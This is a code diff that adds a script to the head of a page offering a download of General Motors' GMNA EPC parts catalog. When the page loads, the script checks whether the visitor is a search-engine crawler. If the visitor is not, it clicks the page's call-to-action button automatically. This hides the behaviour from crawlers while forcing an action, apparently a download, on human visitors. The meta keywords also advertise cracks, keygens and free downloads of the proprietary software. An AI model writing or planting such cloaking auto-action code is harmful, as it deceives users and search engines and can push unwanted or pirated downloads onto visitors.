@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>General Motors GM GMNA EPC 05.2024 North America</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download General Motors GM GMNA EPC 05.2024 for North America. Detailed spare parts and accessories catalog for vehicles from 1953 to 2024.">
     <meta name="keywords" content="General Motors GM GMNA EPC 05.2024 North America, General Motors spare parts catalog, GM accessories catalog, GM parts catalog 2024, GM EPC 2024, GM EPC 2024 free download, GMNA EPC download, GMNA EPC download free, GM EPC crack, GM EPC 2024 keygen, General Motors EPC download, General Motors EPC free download, содержит информацию об автомобилях General Motors 1953-2024, каталог запчастей General Motors скачать, каталог запчастей General Motors бесплатно скачать, запчасти Buick поиск, запчасти Cadillac поиск, запчасти Chevrolet поиск, запчасти GMC поиск, General Motors каталог автозапчастей, каталог аксессуаров General Motors скачать бесплатно, General Motors запчасти каталог 2024, General Motors EPC скачать, General Motors EPC скачать бесплатно, General Motors EPC взлом, General Motors EPC 2024 ключ, catálogo de piezas GMNA, descargar catálogo de partes GM, General Motors catálogo EPC, descargar catálogo EPC gratis, catálogo de accesorios General Motors, GMNA software de piezas de repuesto, catálogo de partes GM, GMNA EPC 北美通用汽车零件目录, 北美通用汽车零件目录免费下载, 2024 GMNA 技术信息, North America GM spare parts catalog, buick parts catalog, cadillac spare parts finder, chevrolet parts lookup, навигация по запчастям GM, ськідка на каталог запчастин General Motors, каталог запчастин GM 2024, скачати каталог запчастин GM, General Motors पार्ट्स कैटलॉग 2024, डाउनलोड General Motors पार्ट्स कैटलॉग मुफ़्त में">
     <style>
